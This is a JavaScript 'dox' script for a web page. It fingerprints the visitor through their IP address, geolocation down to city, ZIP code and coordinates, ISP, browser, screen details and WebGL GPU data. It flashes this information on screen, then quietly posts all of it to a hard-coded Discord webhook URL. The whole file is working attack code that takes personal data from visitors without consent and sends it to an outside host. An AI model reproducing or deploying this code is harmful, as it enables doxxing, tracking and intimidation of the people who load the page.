async function startDox() {
    console.log("Collecting client info...");

    const doxElement = document.getElementById("dox");
    const doxBgVideo = document.getElementById("dox-bg-vid");
    const doxOverlay = document.getElementById("dox-overlay");

    if (doxBgVideo) doxBgVideo.play();
    if (doxElement) doxElement.style.opacity = "1";

    let fontSize = Math.min(window.innerHeight / 10, window.innerWidth / 20);
    if (doxOverlay) doxOverlay.style.fontSize = fontSize + "px";

    const collectedData = {};

    async function displayInfo(label, value) {
        collectedData[label] = value;

        if (!doxOverlay) return;

        const span = document.createElement("span");
        span.innerText = `${label}: ${value}`;
        doxOverlay.appendChild(span);

        const height = doxOverlay.getBoundingClientRect().height;
        if (height > window.innerHeight) {
            fontSize = fontSize - fontSize / 10;
            doxOverlay.style.fontSize = fontSize + "px";
        }

        await new Promise(res => setTimeout(res, 300));
    }

    try {
        const ipData = await (await fetch("https://wtfismyip.com/json")).json();
        const ip = ipData.YourFuckingIPAddress;
        const locationData = await (await fetch("https://we-are-jammin.xyz/json/" + ip)).json();

        const ua = navigator.userAgent;
        const browserData = new BrowserDetector(ua).parseUserAgent();

        await displayInfo("IP Address", ip);
        await displayInfo("Country", locationData.country);
        await displayInfo("Region", locationData.regionName);
        await displayInfo("City", locationData.city);
        await displayInfo("ZIP Code", locationData.zip);
        await displayInfo("Full Location", ipData.YourFuckingLocation);
        await displayInfo("Latitude", locationData.lat);
        await displayInfo("Longitude", locationData.lon);
        await displayInfo("Timezone", locationData.timezone);
        await displayInfo("Current Time", new Date().toLocaleString());
        await displayInfo("ISP", locationData.isp);
        await displayInfo("Organization", locationData.org);
        await displayInfo("AS", locationData.as);
        await displayInfo("Browser", browserData.name);
        await displayInfo("Platform", browserData.platform);
        await displayInfo("Version", browserData.version);
        await displayInfo("Mobile/Tablet", browserData.isMobile || browserData.isTablet ? "Yes" : "No");
        await displayInfo("Referrer", document.referrer || "None");
        await displayInfo("Languages", navigator.languages.join(", "));
        await displayInfo("Screen", `${screen.width}x${screen.height}`);
        await displayInfo("Window", `${window.innerWidth}x${window.innerHeight}`);
        await displayInfo("Pixel Depth", screen.pixelDepth);
        await displayInfo("Orientation", screen.orientation?.type?.split('-')[0] || "N/A");
        await displayInfo("Rotation", screen.orientation?.angle + "°" || "N/A");
        await displayInfo("CPU Threads", navigator.hardwareConcurrency);
        if (performance.memory) {
            const memoryMB = Math.round(performance.memory.jsHeapSizeLimit / 1024 / 1024);
            await displayInfo("Memory Limit", memoryMB + " MB");
        }

        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (gl) {
            const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
            if (debugInfo) {
                const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                await displayInfo("GPU Vendor", vendor);
                await displayInfo("GPU Renderer", renderer);
            }
        }

        // 🔁 Send all collected data to Discord webhook
        sendToDiscordWebhook(collectedData);

    } catch (error) {
        console.error("Error collecting info:", error);
    }
}

function sendToDiscordWebhook(data) {
    const webhookUrl = "https://discord.com/api/webhooks/1402845085288366261/FummiU0Zb1bHBQC6qhMyTOx-ba990D6lSEnBmegUzkIH_kj-n3doBp7C6eFJtHBkJaxh";

    const embed = {
        title: "New Client Info Logged",
        color: 0x3498db,
        fields: Object.entries(data).map(([name, value]) => ({
            name,
            value: String(value || "N/A"),
            inline: false
        })),
        timestamp: new Date().toISOString(),
        footer: {
            text: "Client Logger"
        }
    };

    fetch(webhookUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ embeds: [embed] })
    }).catch(console.error);
}